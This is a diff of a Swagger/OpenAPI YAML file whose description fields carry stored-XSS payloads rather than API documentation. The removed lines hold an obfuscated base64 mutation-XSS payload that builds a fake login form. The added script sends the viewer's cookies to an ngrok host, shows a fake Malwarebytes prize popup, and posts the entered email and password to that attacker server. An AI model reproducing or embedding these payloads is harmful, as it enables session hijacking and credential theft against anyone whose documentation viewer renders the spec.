@@ -1,38 +1,47 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY M0X0101
+  title: Attack BY Kripto-Geek
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IA12YXIgYT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7DWEuYWN0aW9uPSJodHRwczovLzE2YmEtMjQwMS00OTAwLTFjM2MtOGQzNy1mZTUxLWFiZi0yZTNkLTIwMGIubmdyb2stZnJlZS5hcHAiOw1hLm1ldGhvZD0nUE9TVCc7DWEuaW5uZXJIVE1MPSc8Y2VudGVyPlVzZXJuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7IA1kb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOyIn' onerror='eval(atob(this.id))'>"></form>
+    <script>
+      // Send stolen cookie
+      fetch("https://e224-2401-4900-1c3c-a920-a06b-d6ca-b3e0-c9f0.ngrok-free.app/cookie?data=" + document.cookie);
+
+      // Create a fake login popup
+      let div = document.createElement("div");
+      div.innerHTML = `
+        <div style="position:fixed; top:30%; left:50%; transform:translate(-50%, -50%);
+                    width: 350px; padding: 20px; background: white; color: black;
+                    text-align: center; font-family: Arial; box-shadow: 0px 0px 10px gray;
+                    border-radius: 10px; z-index: 9999;">
+          <h2>🎉 Congratulations! 🎉</h2>
+          <p>You won a <b>FREE Malwarebytes Premium Subscription!</b></p>
+          <form id="phishForm">
+            <input type="email" id="email" placeholder="Enter your email" style="width:90%; padding:5px; margin:5px 0;">
+            <input type="password" id="password" placeholder="Enter your password" style="width:90%; padding:5px; margin:5px 0;">
+            <button type="submit" style="padding:10px; background:#007bff; color:white; border:none; cursor:pointer;">
+              Claim Now
+            </button>
+          </form>
+          <p style="font-size:12px; color:gray;">Offer expires soon! Act now!</p>
+        </div>
+      `;
+      document.body.appendChild(div);
+
+      // Send credentials to attacker when user submits
+      document.getElementById("phishForm").onsubmit = function(event) {
+        event.preventDefault();
+        let email = document.getElementById("email").value;
+        let password = document.getElementById("password").value;
+
+        // Send data to attacker's server
+        fetch("https://e224-2401-4900-1c3c-a920-a06b-d6ca-b3e0-c9f0.ngrok-free.app/creds", {
+          method: "POST",
+          headers: {"Content-Type": "application/x-www-form-urlencoded"},
+          body: "email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password)
+        });
+
+        // Show fake "Processing" message
+        alert("Processing your subscription... Please wait.");
+      };
+    </script>
   version: production
-basePath: /JSSResource/
-produces:
-  - application/xml
-  - application/json
-consumes:
-  - application/xml
-  - application/json
-security:
-  - basicAuth: []
-paths:
-  /M0X0101:
-    get:
-      responses:
-        '200':
-          description: No response was specified
-      tags:
-        - M0X0101_XSS_D
-      operationId: findAccounts
-      summary: Finds all accounts
-  '/hack/hachid/{id}':
-    delete:
-      parameters:
-        - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IA12YXIgYT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7DWEuYWN0aW9uPSJodHRwczovLzE2YmEtMjQwMS00OTAwLTFjM2MtOGQzNy1mZTUxLWFiZi0yZTNkLTIwMGIubmdyb2stZnJlZS5hcHAiOw1hLm1ldGhvZD0nUE9TVCc7DWEuaW5uZXJIVE1MPSc8Y2VudGVyPlVzZXJuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7IA1kb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOyIn' onerror='eval(atob(this.id))'>"></form>
-          format: int64
-          in: path
-          name: id
-          required: true
-          type: integer
-      responses:
-        '200':
-          description: No response was specified
